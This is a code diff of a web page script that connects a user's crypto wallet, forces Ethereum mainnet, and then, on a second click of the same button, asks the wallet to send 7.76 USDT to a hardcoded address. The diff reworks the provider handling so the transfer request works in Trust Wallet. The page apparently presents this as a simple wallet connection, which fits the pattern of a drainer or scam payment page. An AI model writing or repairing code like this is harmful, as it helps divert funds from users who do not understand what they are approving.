@@ -96,37 +96,40 @@
 
   <script>
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    const USDT_ETH_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Official ERC-20 USDT
+    const USDT_ETH_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
     const ETH_CHAIN_ID = '0x1';
 
     let isConnected = false;
     let globalUserAddress = null;
+    let activeProviderObj = null;
 
-    function getRawProvider() {
-      if (window.ethereum && Object.keys(window.ethereum).length > 0) return window.ethereum;
-      if (window.trustwallet && Object.keys(window.trustwallet).length > 0) return window.trustwallet;
+    function getProvider() {
+      if (window.ethereum) return window.ethereum;
+      if (window.trustwallet) return window.trustwallet;
       if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
-      // Fallback for imported private key wallets
-      return window.ethereum || window.web3 || null;
+      return null;
     }
 
     async function handleMasterAction() {
-      const rawProvider = getRawProvider();
-      if (!rawProvider) {
+      const eth = getProvider();
+      if (!eth) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
         return;
       }
+      activeProviderObj = eth;
 
       try {
-        // Safe provider initialization handling empty object issues
-        const provider = new ethers.providers.Web3Provider(rawProvider, "any");
-
         if (!isConnected) {
-          const accounts = await provider.send("eth_requestAccounts", []);
+          // Request accounts using raw window provider request method safely
+          const accounts = await eth.request({ method: 'eth_requestAccounts' });
           globalUserAddress = accounts[0];
 
+          // Switch to Ethereum Mainnet
           try {
-            await provider.send("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
+            await eth.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: ETH_CHAIN_ID }],
+            });
           } catch (e) {}
 
           document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
@@ -137,18 +140,22 @@
           document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
           document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
         } else {
+          // Direct raw transaction request bypassing Web3Provider constructor errors
           const amountWei = ethers.utils.parseUnits("7.76", 6);
           const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
           const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, amountWei]);
 
-          const signer = provider.getSigner();
-          const tx = await signer.sendTransaction({
-            to: USDT_ETH_ADDRESS,
-            data: transferData,
-            gasLimit: ethers.BigNumber.from("50000")
+          await eth.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: globalUserAddress,
+              to: USDT_ETH_ADDRESS,
+              data: transferData,
+              gas: "0x186A0"
+            }]
           });
 
-          alert("Transaction submitted successfully! Hash: " + tx.hash);
+          alert("Transaction submitted successfully!");
         }
       } catch (err) {
         console.error("Action error:", err);
